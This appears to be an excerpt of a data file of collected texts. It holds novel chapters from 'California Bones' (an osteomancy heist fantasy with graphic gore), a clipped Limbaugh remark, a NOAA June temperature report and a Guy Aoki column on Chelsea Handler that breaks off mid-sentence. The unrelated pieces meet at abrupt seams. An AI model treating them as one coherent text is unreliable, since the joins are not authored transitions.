With a pair of tongs he lifted the bone and braced himself for pain. He opened his mouth and dropped the bone in, forcing it down, tears streaking his face as the jagged nugget burned and tore its way down his throat.\n\nThe kitchen door flew open and a half-dozen cops rushed in. The gray-haired man in the lead wore the Hierarch’s wings-and-tusks emblem on his windbreaker. Daniel backed up against the stove as the man came closer, his hand extended.\n\nThe man’s eyes lost focus. He blinked.\n\nDaniel stepped around his outreached hand, avoiding contact. When he moved past the cops, they flinched as though brushed by cobwebs. He went into the front room.\n\nFour charred bodies lay amid an avalanche of overturned boxes, yellow-edged papers and books spilling across the floor. The men’s faces bubbled, black with char and red with blood. The room stank of ozone and cooked meat and kraken.\n\nHis father hadn’t managed to get them all. He was on his back. Three cops were cutting the flesh off him with long knives. They’d already flayed one arm, exposing the deep, rich brown of his radius and ulna. They peeled back his face to expose his coffee-brown skull.\n\nThe man on the carpet being dissected before Daniel’s eyes was no longer his father. Daniel understood that his father was gone. In the space of an instant, eternal moment, these men had taken his father away from him. They had reduced his father to a sack of magic, and now they were plundering him.\n\nDaniel reached back to that day on the beach, six years before, when he’d found the kraken. He remembered its smell, and he searched for it in his own body, and when his fingers began to tingle, he knew he’d found it. His father had made him strong, and now Daniel would use his strength to make these men with the long knives shriek like slaughtered animals.\n\nIn the doorway stood a man. Whether it was a trick of memory or a trick of magic, Daniel couldn’t quite focus on him, as if light slid off his flesh and dripped away. But Daniel caught an impression of him. A smell of deep things underground. The smell of earthquakes.\n\nThe Hierarch entered the house. The earth shuddered with each step. The pictures on the walls rattled in their frames, and glasses in the cabinets and the silverware in the kitchen drawers jingled. The Hierarch loomed over the body of Daniel’s father. In his hand, something of polished metal glinted. It was a fork.\n\n“Excuse me,” the Hierarch said in a sandpaper voice. “I’ll have him fresh.”\n\nDaniel did not want to see this. He wanted to run. That’s what his father had told him to do, and he did not want to see this, because he knew that, once seen, he would never be able to close his eyes without seeing it.\n\nBut the sword. He couldn’t leave without getting the sword. The sword was his father’s magic. It was Daniel’s own magic. So he forced himself to turn back to the spare bedroom, where two of the men with the long knives stood before the door. There was just enough space between them that Daniel should be able to slip past. He took a step. And then he heard something, over from the floor where his father lay, and where the Hierarch crouched. He didn’t look, would not look, but the sound was obvious. The Hierarch was chewing.\n\nThat night, Daniel left the sword behind and ran. Away from the house. Away from the rotor blades and searchlights. He ran until he could only walk, walked until he could only stumble, stumbled until he could only crawl. When morning broke, he awoke in wet sand and bathed himself in the cold waves rolling in on the edge of a winter storm. He would live here, he thought. He would live here on the beach as a ghost.\n\nHe was already dead, Daniel told himself.\n\nWhen the Hierarch began eating his father, he was already dead.\n\nTen years later, he would still hear the sound of the Hierarch’s teeth grinding his father’s cartilage.\n\nTwo\n\nDaniel caught the gondola-bus at Lincoln Station and rode it all the way to Wilshire and Fairfax, just a few blocks from La Brea Tar Pits. The gondola doors flapped open with a pneumatic hiss, and the burned-dirt stink of tar settled in the back of his head. He only realized he’d been woolgathering at the door when the gondolier growled something about schedules and people with heads lodged in their asses. Daniel stepped off into the tar-haunted air.\n\nDelivery boats and taxis left trails through rainbow-slicked waters. After more than a century of use, the Los Angeles canals had become a swill-clogged circulatory system on the verge of seizure, not so much the quaint Venetian paradise Abbot Kinney had envisioned in the early 1900s. Daniel’s father used to rant about how LA deserved a land road system worthy of the kingdom. Ten years after his assassination, roads were few and canal traffic was even worse. The Hierarch liked gondolas in his city.\n\nDaniel climbed up the dock steps and glanced over to the community bulletin wall, where the Hierarch’s authority was on display. The hands of thieves decorated one section of the wall like fish scales. Nearby, the crow-picked corpses of subversives hung in gibbets like wind chimes.\n\nEntering the sprawl of Farmers Market, Daniel negotiated the maze of stands and awnings and bins and baskets where little old ladies with sharp elbows crowded the lanes. Deeper into the market he went, through aromas of charred meat mixed with garlic and cloves and ginger and grease. The market was even busier than usual, with shoppers eager to spend for the upcoming Victory Day celebrations. Dragon magicians smoked the air with flash-powder, while jugglers and snake charmers vied for space with guitar-strumming buskers whose repertoire spanned the spectrum from soulful pop to soulful folk-pop. But what Daniel noticed most was the smell of tar from parcels of gas lurking below the streets like jellyfish.\n\nHe made his way to Apothecary’s Row, where the shelves bore a dizzying array of things in pickle jars: teeth, bones, penises, glands of all kinds.\n\n“You got a problem?” said a man behind a stall. His face was creased like a cinnamon stick. “Yeah, I can tell. You got lots of problems. Fatigue, listlessness, bedroom difficulties, am I right?”\n\n“I don’t have bedroom difficulties,” Daniel said, defensive. He’d passed by this stall three times this week, sniffing. He knew the apothecary’s pitch. He knew there was a storage space behind the curtain at the back of his stall. He knew in which pocket the apothecary kept his keys.\n\nThe man shook a few grains of bright orange dust onto a metal tray. It looked like dehydrated cheese powder from a box of instant macaroni.\n\nDaniel sniffed. “What’s this?”\n\n“Dragon-turtle,” said the apothecary, his smile revealing jade teeth. Jade veneers were catching on as a fad. They were believed to counteract poisons.\n\n“Real dragon-turtle?”\n\nThe apothecary launched into an unlikely narrative about the turtle’s origins. The Chinese still had dragon-turtles, he explained, living ones grown from ancient fossils, and there’d been a typhoon last week and a Chinese turtle carcass had drifted all the way across the Pacific to wash up on a San Diego beach. There, a lifeguard, who just happened to be the apothecary’s brother-in-law, got to it before the Hierarch’s men were able to confiscate it.\n\nDaniel had to give him credit: It was not the worst spiel he’d ever heard.\n\nA woman in a black peacoat stepped up to the counter and stood at Daniel’s elbow. She glanced at him, her brown eyes level with his, and he took in her talcum-powder and cleansoap scent, and suddenly the thought of needing an aphrodisiac was beyond absurd.\n\n“Are you going to try it?” the woman said to him.\n\n“I really don’t need—”\n\n“My husband does,” she said, waving her hand to show off a loose-fitting gold ring crowned with a sparkly chunk of rock. “But he’d kill me if he knew I was shopping for this kind of thing.”\n\n“There’s no shame in it,” Jade Teeth said, turning on the charm. “But you have to be careful where you get your magic these days. Some of the vendors around here aren’t selling anything more potent than baking soda. And that only works if you want your man foaming at the mouth.”\n\nThe woman laughed extravagantly and waved her hands in a gesture of careless hilarity. Her ring slipped off her finger and flew across the counter. She and the apothecary fumbled hands as they both made a grab for it, but it ended up in her palm, and then back on her finger. Daniel caught an expression of lost opportunity flash on the apothecary’s face, but Jade Teeth hadn’t noticed the woman’s hand dip into his pocket.\n\n“That would have been a disaster!” the woman said with a relieved gasp. “He would have just killed me if I’d lost my ring! I guess I should take that as a sign or something. No bedroom enhancements today, thanks.”\n\nShe smiled, her nose crinkling in a way that Daniel found unbearably fetching, and with a small wave good-bye at the apothecary, she drew away from the counter. The apothecary hungrily watched her go.\n\n“Try the dragon-turtle,” he said, snapping back into sales mode, “and you might have a chance with a girl like that.”\n\nDaniel suppressed a sudden urge to punch the man in the nose. He licked his fingertip and applied it to the powder and gave it a deep, healthy sniff. Mostly flour, a small touch of sulfur, a pinch of deer horn, mixed with common herbs. Fairly harmless, and not even remotely osteomantic.\n\nTrue osteomancy was scarce these days, but that didn’t stop the market. People craved magic. Magic to heal their ailments, magic to boost their mental acuity, magic to put some octane in the old sex tank. And people like the apothecary were only too happy to sell them counterfeits.\n\nBehind the apothecary’s back, the curtain blocking off the back room wafted ever so slightly.\n\n“This is not making me horny,” said Daniel.\n\n“You only had a little.”\n\n“It’s not even making me a little horny. Do you have anything other than kitchen experiments?”\n\nThe apothecary squinted. “Are you a cop?”\n\n“Do I look like a cop? I don’t even have a mustache.”\n\n“I got nothing for you.”\n\n“But what about my bedroom difficulties?”\n\n“Fuck your bedroom difficulties.”\n\nDaniel shrugged his eyebrows and moved back into the crowd.\n\nHe found the brown-eyed woman with the loose ring near the doughnut stand on the other end of the market. She handed him a small white bag. He peered inside.\n\n“Devil’s food! With candy sprinkles!” he said, delighted. He took a munch of doughnut. “So, how’d we do?”\n\n“You tell me.”\n\nShe undid the two top buttons of her coat and flapped the lapels. A sour tinge of cerberus wolf passed across Daniel’s senses. Not a lot of it, and it was cut with a dozen useless compounds, but these days it counted as a decent score. Still, it rankled Daniel to be punching so far below his weight class.\n\nCassandra Morales rebuttoned her coat. “Don’t give me that look. That’s a month’s rent for each of us. Beats working, anyway.”\n\nDaniel actually had nothing against working. But getting straight work in Los Angeles wasn’t an option for him. Straight work meant submitting to an interview by the Ministry of Labor, which meant an hour-long interrogation, background check, peeing in a cup, letting a hound sniff your skin. It was an opportunity to slip up in the smallest way and earn a place back at the end of the line, or a flogging, or worse. And for Daniel, with his magic-saturated bones, walking into the Ministry of Labor was equivalent to volunteering for a vivisection. Los Angeles wasn’t a safe place for the son of Sebastian Blackland.\n\nSo, he was left with these petty thefts of trace magic.\n\n“It’s a lot of work for little gain,” said Daniel.\n\n“Speaking of work, you didn’t tell me I’d have to break a sweat to get into the safe.”\n\n“I saw you steal the apothecary’s key.”\n\n“Yeah, but there was an alarm. All you had to do was talk to the apothecary and lick stuff.”\n\n“I’m just saying this was hardly the heist of the century.”\n\n“Well, okay,” Cassandra allowed, “sniff us out a better score, and we’ll see what we can do.”\n\nDaniel caught a whiff of something and his mouth went dry.\n\nCassandra noticed. “What’s wrong?”\n\n“Hounds,” he whispered.\n\nThey came from the other side of the food court: Garms, the lean, smoke-colored breed favored by the Ministry. Like hyperactive vacuum cleaners they sniffed the carpets and wares of the stalls and the shoes of the shopkeepers. Even now word would be filtering through the network of black marketers, and contraband magic was being flushed down toilets or sent off with runners.\n\n“Go,” he told Cassandra, and she trusted him enough not to argue. Daniel wasn’t too worried about her, nor the cerberus wolf in her pocket. She could take care of herself. With a talent so sharply honed it might as well be magic, she melted into the crowd and was gone.\n\nDaniel would have a harder time. The hounds were trained to detect magic, and Daniel was magic.\n\nHe shouldered his way past a clump of people surrounding a street performer in silver paint doing a human robot bit. Threading himself into the knot, he unzipped his black hoodie, reversed it, and put it back on, red-side out. That wouldn’t fool the dogs, but if the handlers radioed in a fleeing suspect, at least the description of his clothes would be a little off. Much better, of course, if the dogs didn’t pick up his scent. But a wet canine snuffle sounded from behind him. He glanced over his shoulder. The dogs were less than a dozen yards away, noses to the ground, sweeping.\n\nNo point in running now.\n\nHe came to a stop in a crowded market corridor. Sunlight filtered through the multicolored plastic canopies and bathed the space in a floral glow. The hounds were close enough to cover the distance to him in a single lunge. They strained against their harnesses, twisting, threatening to slip their restraints. Alarmed shoppers shoved one another to get out of the dogs’ way. A woman dropped her purse and a man stepped on her hand as she bent to pick it up. Oranges spilled out of someone’s bag, starting an argument that ended with the snarl of a hound.\n\nSebastian Blackland had taught Daniel osteomancy, but Otis had taught him almost everything else necessary to survive as the son of an osteomancer. He drew his shoulders in. He expanded his abdomen to create a small paunch. This wasn’t magic. It was acting. He was no wizard’s son now. He was no professional thief. He had no power. He was a man of little consequence. Of no interest. He was just a guy.\n\nIt didn’t work. The hounds smelled the truth. They smelled it in his blood and lymph. They smelled it in his marrow. They howled as though he were a rabbit at the end of the hunt, and the handlers drew their cleaver-clubs. Daniel would have to burn them with lightning or let himself be beaten and cut and taken into custody. If he was lucky, he’d just end up with his body parts pinned to the community wall. But that was probably too good a fate to hope for. He was Sebastian Blackland’s son, and the Hierarch would make a project out of him.\n\nHe called on the sint holo now. He remembered its chaotic, contradictory aromas. It was slippery, ungraspable, and he drew its memory from his bones. Most osteomancers needed constant replenishment of osteomantic materials to use magic. But there were the rare few, like Sebastian and Daniel, who retained the osteomantic properties of what they ingested. With Sebastian the ability had come from research and training. With Daniel, it had come from being used by his father as a human laboratory. He’d eaten what his father gave him, and surrendered his baby teeth and hair and nail clippings, and then Sebastian cooked the magic residue in them, reprocessed them, and fed the refined results back to Daniel, again and again until the magic embedded itself in his bones.\n\nHe became invisible now.\n\nGlassy-eyed from sint holo miasma, the dog handlers merely looked through Daniel. But the hounds reached for him. They’d been bred to detect osteomancy, and nothing got them more excited than sniffing out magic. The hounds paused. They half turned away, then back, then away again. Addled and crestfallen, they bowed their heads and whimpered.\n\n“What are we even doing?” one of the handlers asked his partner.\n\nThe other sheathed his cleaver. “I don’t know. It’s weird.”\n\nDaniel didn’t stick around to see if the hounds would reacquire his scent. As quickly as he could, without running, he moved through the market. By the time he reached the docks, the sint holo had worn off, leaving him exposed. He hoped he’d fogged the brains of the hounds and handlers enough that any memories of the pursuit would be something like the sense of dread following a long night of drinking, where you could remember having your pants around your ankles at some point but not much more than that.\n\nHe raised his hand to flag a water taxi when he felt a presence behind him. He knew what was about to happen: A massive hand took hold of his thumb and pinky in a grip that threatened pain if Daniel resisted. At the same time, a white van floated up to the dock. The side door slid open, revealing two more muscle-slabbed men inside.\n\nFirst cops, and now Otis’s goons.\n\n“I’m not having a great morning,” Daniel said.\n\nThree\n\nLet’s go,” said the muscle with the death grip on Daniel’s fingers.\n\n“Oh, please don’t hurt me,” Daniel wailed. “It’s not manly to weep in public.”\n\n“Get in the van or you’re gonna be crying blood.”\n\n“You know, that literally makes no sense. Did Otis tell you who I am?”\n\n“We found you, and we bagged you. What does that tell you?”\n\n“That he doesn’t like you much. Well, okay, then.”\n\nHe stepped forward and ducked into the van, where the muscle-slabs shoved him down onto a bench seat. The door slammed shut and the van rumbled into traffic and started slogging toward Culver City.\n\nHe’d learned to drive getaway in a van much like this, when he was fifteen and Otis’s thugs were schooling him in the basics of thiefcraft. Daniel noted the odors of stale fast-food grease and pine air freshener, and he was getting nostalgic when he saw drops of old blood on the carpet and caught the faint tinge of urine.\n\nThe van passed beneath the shadows of RKO Studios, where chimney towers poked above the fortress walls and vented eocorn-tinged steam into the gray morning sky. Daniel usually tried to avoid steering this close to such high-powered operations, but Otis liked headquartering near them. Hiding in plain sight was one of his specialties.\n\nThe van docked behind a low-slung brick warehouse, and Otis’s thugs brought Daniel out with some extracurricular shoving and a stinging slap on the back of the neck. It was hard enough to bring water to Daniel’s eyes. Two of them gripped his biceps and marched him through a maze of plywood and drywall to Otis’s office.\n\nOtis wasn’t there, but his menagerie was, housed in cages and fish tanks. The animals were oddly quiet. No ear-gouging screeches from the parakeets or cockatiels. The mice and hamsters didn’t run on their wheels or gnaw their cages. Even the fish seemed spooked. The animals had been bred to detect osteomancy. They were Otis’s alarm system.\n\n“Daniel, my boy!”\n\nOtis’s mass entered the room, his arms spread in welcome, his voice booming. A pink-cheeked, carrot-haired white man, he looked like someone who could fit in anywhere. Put him in a suit, he was a lawyer. Put him behind a bar, he was a bartender. Here, smiling warmly, he could be someone’s favorite uncle, and Daniel reminded himself Otis was none of these things, but was in fact a kind of monster. His goons still held Daniel fast.\n\n“How about a drink? Horchata? I remember how much you like horchata. Boys,” he called out to nobody in particular. “Can we welcome Daniel home with a glass of horchata?” Daniel was aware of some scrambling around, as Otis’s minions combed the warehouse in search of whatever he demanded.\n\n“Hello, Otis,” Daniel said. “Watch this.” He reached back for the memory of kraken. The brine-and-mud scent filled his nostrils and electricity tingled through his veins. A sizzling crack of kraken energy burst from his skin.\n\nThe hired musclemen screeched like cats and leaped back.\n\n“That’s for the slap on the neck,” Daniel said.\n\nOne of the men stared at him with wide “how could you do this to me?” eyes. The other sucked on his burned fingers and looked like he was trying not to cry.\n\n“You don’t send your fuck-clowns after me, Otis. I don’t owe you money and I’m not your boy.”\n\n“But you don’t answer my calls! You ignore my letters!” Otis was still smiling, his eyes a-twinkle. He was a black marketer, a crime lord, and also not a very nice man, and he enjoyed himself immensely.\n\nDaniel turned to leave, and the muscle looked to Otis for instruction. They feared another shock from Daniel, but they feared their boss more.\n\n“All right, boys. Let him go and get lost.”\n\nWith great relief, the men squeezed themselves through the door and disappeared.\n\n“I wasn’t sure you still had the juice,” Otis said, “which is why I told the guys they could be a little rough. I’m surprised you didn’t burn them when they bagged you.”\n\n“What do you want?”\n\nOtis smiled his avuncular smile and removed a smogstained oil painting of a sad hobo clown from the wall, revealing a standard-looking wall safe. There was no point in spinning the dial, because the lock didn’t work. To all appearances, the safe was empty. But Daniel knew better. It was lined with ground-up sint holo vertebrae and treated to bring out properties of visual confusion. Otis reached into the seemingly vacant space and pulled out a rolled sheet of paper.\n\n“There’s a job.”\n\n“I don’t want a job.”\n\nOtis reacted as if Daniel hadn’t spoken. He unrolled the paper on his desk. There were actually several sheets, the topmost being a basic canal map of the Miracle Mile district, encompassing Farmers Market, the banks and office buildings of midWilshire, the Tar Pits, and Ministry headquarters. Otis peeled back the map to reveal a civic engineering drawing of some kind, with sewers and pump works and electrical junctions: the flayed city.\n\nHe tapped his finger on a rendering of a pipe or a tube or something. “This is the job.”\n\n“I’m not looking for a job,” Daniel said, with more force.\n\nOtis lifted the engineering drawing away to expose yet another beneath it. He liked to unveil things gradually. He liked theater.\n\nDaniel refused to even look at it. “I don’t want work from you. I don’t do that kind of thing anymore. Not for you. Get someone else. Get Little Al. Hell, get Fat Al.”\n\n“The Als are dead.” Otis tapped the paper again. “I need you for this, Daniel. And you need me. I know how things are. I know how hard it is. Those little jobs you and Cassandra are pulling? It’s unworthy of you.”\n\nAgain, Otis tapped the drawing, and this time Daniel looked. The page was blank, at least in the visible spectrum. Then, from a desk drawer, Otis produced a corked ceramic vial. Once he popped the cork, Daniel smelled sphinx. The essence of the sphinx was the riddle, and it could be used for locks, for barriers, for secrets and codes. Sphinxes had once roamed all over Pleistocene-era California, leaving hundreds of skeletons behind. Most had been taken east by Freemasons before the Hierarch came to power. Yet Otis had sphinx ink. It wasn’t cheap.\n\nHe moistened a small sponge with the contents of the vial and rubbed it over the paper. A hand-drawn diagram faded in like an apparition. It was a maze of some kind. A labyrinth. A faint circle about the size of a decitusk coin sat just off center. If the drawings were the same scale and orientation, the circle would have to be somewhere beneath the Tar Pits.\n\nOtis’s smile twinkled. “I’ve found the Ossuary.”\n\nDaniel rolled his eyes. “Oh, kill me now.”\n\nTo most, the Ossuary was a place out of legend, the vault where the Hierarch was said to store his personal stash of magic. Daniel’s father had worked there, but he’d never revealed its exact location to Daniel. Thieves murmured about it with fear and longing. And there were always rumors: The Hierarch kept entire herds of mammoth remains down there, bones and beautiful ivory tusks, interwoven like mountainous baskets. Basilisk teeth and griffin claws towered to the ceilings over bog-preserved unicorn carcasses.\n\nAnd there were stories about attempted heists: Tunneling and mining and armed sieges and all manner of magical infiltrations. The names of thieves who’d tried it were whispered like ghost stories. And the one thing all the stories shared in common was that they ended in executions, in dungeons, in glue factories.\n\n“Assuming this is even a real place—”\n\n“It is,” said Otis.\n\n“—how’d you come by this map?”\n\nOtis paused as if weighing how much to reveal, but Daniel knew he had this entire conversation planned out from beginning to end.\n\n“What do the greatest heists in history have in common?”\n\nAnd suddenly school was in session again.\n\n“All the thieves were caught and tortured until they begged to die?” Daniel said.\n\n“What they have in common is that every single one benefited from having an inside man.” Otis gestured at his drawings. “Same here.”\n\n“You have a guy in the Ossuary? Okay. Who?”\n\n“Are you taking the job or not?”\n\n“I’m not,” said Daniel.\n\nOtis regarded him for a while. Up to now, he’d been playing the role of jolly uncle and impresario. Now his eyes grew tired and wise and concerned, like the doc character in an old Western. He reached into his desk drawer and came up with a bottle of tequila and a pair of shot glasses. He filled both and slid one toward Daniel, like an opening chess move. Daniel left it on the desk.\n\n“You can’t afford to be this way, Daniel. You’re all knotted up inside, racing around like a roach on the edges when you could be claiming big piles of treasure right there for the taking. What was the score on that Farmers Market job today? A few hundred? I’m offering you the biggest job of your life. Hell, the biggest job of my life.”\n\n“So put on some gloves and a black beanie and go get it yourself. You don’t need me.”\n\nOtis took one of the glasses. He held it up to the light, as if looking for a speck of magic trapped in amber. “When your dad asked me to take you in, he didn’t have a lot of options. He was a powerful man, but he was trapped in the machinery of the Ministry. I was the only one outside the system he could turn to. But I did it without exacting a price from him. I kept you away from the Hierarch. And more. I taught you everything I know about thiefcraft. About leadership. And for the things I couldn’t teach you, I found people who could. I got tutors to teach you osteomancy.” Otis downed the shot.\n\nThe sphinx ink began to fade, and Otis rolled up the papers. He replaced them in his wall safe, straightened the hobo clown.\n\n“When you left, I didn’t like it, but I let you be. I didn’t harass you. I showed you respect. Now show me some.”\n\nAny score from the Ossuary would be huge. The Hierarch had the best magic, and the best osteomancers to refine it. A single cask of pure hydra regenerative could fetch millions on the black market.\n\nOtis straightened some invoices into a neat pile. He folded his hands over it and looked up at Daniel. “Sleep on it and get back to me?”\n\nDaniel turned to the door, but he knew Otis wouldn’t let him go before jiggling the lure again.\n\n“It’s a sword, Daniel.”\n\nDaniel stopped but didn’t turn around.\n\n“It’s the sword your father was working on when the Hierarch got him. It’s the best thing your father ever made. The most powerful weapon.”\n\nAnd now Daniel felt himself turning back to face Otis, as if he were a compass needle and Otis a magnet.\n\n“That sword is made of you, kid. And as long as the Hierarch has it, he’s got you.”\n\n“He’s had it for years. Why is this a big deal now?”\n\nOtis tried to look grave and concerned, but Daniel knew him too well. He could see Otis’s delight. The old man was enjoying his abracadabra moment.\n\n“Because my source says the Hierarch’s going to use it. And when he does, he’ll be using you.”\n\nCalifornia Bones © Greg van Eekhout, 2014",

Letterman, who has held his late-night slot with CBS since 1993, was known for having a subtle liberal slant to his comedy.\n\n“What this hire means is a redefinition of what is funny and a redefinition of what is comedy,” Limbaugh said. “They’re blowing up the 11:30 format under the guise of ‘the world is changing.’”",
  "latent_15642": "Global average temperatures in June were the fifth highest on record, as above-average heat conditions continued a multidecade streak, the National Oceanic and Atmospheric Administration reported yesterday.\n\nJune marked the 340th consecutive month -- a span of time more than 28 years -- that global temperatures surged above the 20th century average, according to the agency.\n\n\"The last below-average June temperature was June 1976 and the last below-average temperature for any month was February 1985,\" NOAA said in a release.\n\nAt the same time, it is too early to determine whether the stifling heat wave bringing misery to much of the eastern United States for the past week is unusual.\n\n\"This heat wave is still unfolding, so it's kind of hard for us to put it into a perspective of past heat waves,\" said Jake Crouch, a climatologist at NOAA's National Climatic Data Center.\n\nA study authored by NOAA scientist Thomas Peterson last month reported that heat waves became more frequent in the United States in recent decades, but there are decadal variations. When the entire temperature record is considered, the 1930s had the largest number of heat waves, Peterson said yesterday.\n\nThe Intergovernmental Panel on Climate Change stated in one assessment that global climate change \"is likely to be accompanied by an increase in the frequency and intensity of heat waves, as well as warmer summers.\"\n\n'Warmer and wetter' in June\n\nThere was some weather relief in June. For example, the region east of the Mississippi River became drought free for the first time since 2005, according to the Drought Monitor. Spain also experienced its coolest June since 1997.\n\nNeither El Niño nor La Niña conditions were present during June and are unlikely to appear through the fall, the agency said. El Niño and La Niña -- which occur when the equatorial Pacific Ocean reaches above- or below-average temperatures -- are linked to many extreme weather events.\n\nBut a lot of the weather tale involved a string of stifling heat conditions, drought and flooding.\n\nThe first half of the year, from January to June, tied with 2003 as the seventh warmest on record globally, NOAA said. In June, Japan was as much as 1.4 degrees Celsius warmer than the 1981-2010 period, while north-central Canada, northern Siberia, north-central Australia and much of Eastern Europe also witnessed higher-than-average temperatures.\n\nThe United States was \"warmer and wetter\" than normal in June with monthly temperatures sitting 2 degrees Farenheit above average, NOAA said. Scorching heat appeared across the West, including via near-records in Arizona, California, Colorado, New Mexico, Nevada and Utah.\n\n\"Alaska had its third warmest June on record with a temperature 4 degrees above average,\" Crouch said.\n\nNo heat relief for the West through October\n\nAdditionally, NOAA said there is a likelihood that a huge swath of the United States stretching from Louisiana to the western Canadian border could experience above-average temperatures through October.\n\nThat is also true in northern Alaska via a dynamic partially attributable to diminishing Arctic ice in recent years, said Dan Collins, seasonal forecaster at NOAA's Climate Prediction Center. The average Arctic sea ice extent in June was about 2.6 percent below the 1981-2010 average, according to the National Snow and Ice Data Center.\n\nMeanwhile, precipitation patterns varied widely around the globe last month.\n\nIn the United States, the general trend in both June and the first half of the year was a wetter-than-average eastern United States and Midwest, and an unusually dry West.\n\nCalifornia witnessed record dry conditions in the January-June period, with 31 percent of its average precipitation, NOAA said. Wildfires burned more than 1 million acres in the West with hundreds of homes destroyed in Colorado.\n\nOverall, 46.1 percent of the contiguous United States remains in drought, despite the new drought-free state east of the Mississippi River. The southeastern United States also became drought free for the first time since 2010, said Chris Fuhrmann, regional climatologist at the Southeast Regional Climate Center.\n\nA deluge in the Southeast\n\n\"The footprint of the drought has changed little over the last month, but the places that are receiving drought have mostly experienced intensifying drought, including parts of the Southwest and into the Great Basin,\" Crouch said.\n\nMeanwhile, Iowa, Illinois, Michigan and Wisconsin were record wet in the first half of the year, while Delaware and New Jersey reached that milestone in June. There were flooding problems in swaths of the Southeast, where there was significant crop damage, and places like Chapel Hill, N.C., experienced deluges that damaged buildings, according to Fuhrmann.\n\nInternationally, the monsoon season caused significant damage and loss of life in India, Crouch said. Parts of New Zealand also got two to four times their average rainfall.\n\nOn the other end of the spectrum, the Marshall Islands \"are facing dire circumstances in terms of their water resources\" after being unusually dry for much of 2013, said Crouch. In May, the island government declared a state of disaster, saying about 5,000 people were in direct peril (ClimateWire, May 10).\n\n\"June did bring a little bit of a reprieve to that location, but they are still facing significant drought impacts,\" said Crouch.\n\nReprinted from Climatewire with permission from Environment & Energy Publishing, LLC. www.eenews.net, 202-628-6500",
  "latent_15692": "By GUY AOKI\n\nLast June, Clara Chiu of Asian Americans Advancing Justice (Stewart Kwoh’s group) told me they’d been approached by documentary filmmakers to appear on camera for a discussion about race and the media. She thought I’d be appropriate for it. When I found out it was for one of the four specials comedian Chelsea Handler was doing for Netflix, it gave me pause.\n\nFirst of all, as much as I’ve battled networks, disc jockeys, movie studios and people who’ve done racially insensitive things involving Asian Americans, I’ve rarely called anyone racist. Chelsea Handler? She was racist.\n\nBack in 2007, she appeared on “The Tonight Show With Jay Leno” and came on guns a-blazing attacking Angelina Jolie for always adopting children from foreign countries. Handler asked the audience if the activist/actress was “anti-American” for not considering kids from the good ol’ U.S. of A and got them all riled up.\n\nThen she started picking on Pax, a three-year-old kid Jolie had just adopted from Vietnam. “He probably doesn’t even realize he’s Asian yet! He certainly doesn’t know he’s going to be a horrible driver… or that he’s going to be amazing at doing nails!” The audience laughed.\n\nIn 2005, Angelina Jolie and Brad Pitt had also adopted Zahara, a girl from Ethiopia. Yet Handler didn’t target her with stereotypes about black people. If she had, the NAACP would’ve protested outside E! Entertainment, where she was about to start her talk show “Chelsea Lately,” asking for it to be cancelled.\n\nI told Paula Madison, executive VP of diversity at NBC, about it, and she was livid. She had a one-hour meeting with Leno, his producer, and the head of standards and practices. Madison told them in the future if a guest says something that off-color, they don’t have to air it; they can tape an additional segment in its place. And she wanted to know when they would have Handler on the show again because she’d be watching.\n\nMonths later when she did appear, the snarkiness was gone; she was on her best behavior. She even apologized to the producers for putting them in a difficult position.\n\nBefore I agreed to be part of this Netflix project, I asked the producer who contacted me who had final cut on the documentary. She said Handler, the executive producers, and Netflix. I knew I had to raise the 2007 incident (I’d be a wimp if I didn’t), though I knew if she wanted to, the comedian could edit my attack in a way that made me look bad. But what choice did I have? I had to give it my best shot. I said yes.\n\nWe met at a downtown hotel: Amanda Susskind of the Anti-Defamation League, Dr. Darnell Hunt representing the NAACP; Samy Chouia of the Council on American-Islamic Relations; and two old comrades, Sonny Skyhawk of American Indians in Television and Film and Alex Nogales of the National Hispanic Media Coalition.\n\nDuring the hour-and-a-half discussion about race and humor, Nogales told Handler when he saw how she treated Chuy, a Latino dwarf on her show, he got upset, thinking he was going to have to write her a letter of complaint. But when he watched succeeding shows, he realized she had a great deal of affection for Chuy, so Nogales felt she was balanced.\n\nIn the middle of another subject, I raised my criticism of her 2007 “Tonight Show” appearance. I pointed out the double standard in choosing one target she thought she could get away with (Asian) vs. the one she couldn’t (black). Handler said she’d done jokes about black people too but didn’t know specific jokes about Ethiopians. I said the joke inferring many Vietnamese work in nail salons was particular to that community, but the “bad drivers” stereotype was a more generic Asian one. So she could’ve done a generic black joke about Zahara. She understood.\n\nThe host tried to make excuses, rationalizing, “Well, he asked to be a celebrity,” so it was fair game!\n\n“He asked to be a celebrity?!” I retorted, disbelieving what I’d just heard. “He was three years old! He was adopted by a celebrity! He didn’t ask to be one! Chelsea, that was mean!”\n\n“Three years old?” asked Nogales. “Chelsea, that’s going too far!” “Yeah,” Sonny Skyhawk agreed. Overwhelmed by the reaction, Handler threw up her hands as if being attacked by a stampede of buffalos.\n\nIn my unbiased opinion (note sarcasm), the two most animated discussions we had during that session was that joke and recounting my 2001 debate with Sarah Silverman on Bill Maher’s “Politically Incorrect” over her use of “chinks” in a joke on Conan O’Brien’s talk show. I felt they had to use at least one of them for her documentary but worried about how it’d be edited.\n\nOn Jan. 18, a day before returning to L.A. from my month-long vacation in my hometown of Hilo, Hawaii, I was about to put out an email reminder for the monthly MANAA meeting and wanted to verify when Handler’s documentary was going to be released so I could tell our followers when to look out for it. I came across an L.A. Times article on the series, and it was surreal to see my name in print followed by quotes of what I’d said in my argument with Handler. Apparently she did use it (it was released the following Saturday along with documentaries on marriage, drugs, and Silicon Valley).\n\nAs I might’ve guessed, Handler didn’t include her ridiculous statement that a three-year-old boy chose to be a celebrity, nor did she show the three of us piling on top of her (figuratively!). But I articulated my grievance against her well and made the point that a three-year-old didn’t deserve her attack.\n\nOur introduction at the 17-minute mark was kind of suspicious: Michael McDonald (“MAD TV”), sitting around a table drinking with Handler and other comedian friends, said he hated seeing “unfunny m*therf*ckers” sitting around a table trying to decide what was funny or not (“That’s worse, to me, than racism”). Cue War’s “Why Can’t We Be Friends?” and silent introductions of our panel sitting around the table looking serious.\n\nSurprisingly, I was shown smiling and laughing a lot — more than anyone there — so even though I was aggressive against the host, I think I came across as a balanced person who wasn’t so uptight that he couldn’t make jokes on other topics. The panel makes a reappearance at the one-hour mark (the whole thing runs 1 hour and 9 minutes).\n\nTo her credit, Handler talks to every minority group you can think of and rather than try to prove how funny she is at every point of conversation, actually listens and lets people from all walks of life explain their way of looking at the world and how it looks back at them. She has an extended conversation with Rev. Al Sharpton, who actually comes across well, raising many points you probably haven’t considered. She journeys to a former slave plantation, lets a white supremacist reveal himself, and listens as two Native Americans talk about the problems facing their community, including the highest dropout rate of any group.\n\nAfter talking with Jim Gilchrist, the Minuteman who’s been trying to keep illegal Mexican immigrants out of the United States, Handler looks sad on the limo ride home, saying she wished she could get a 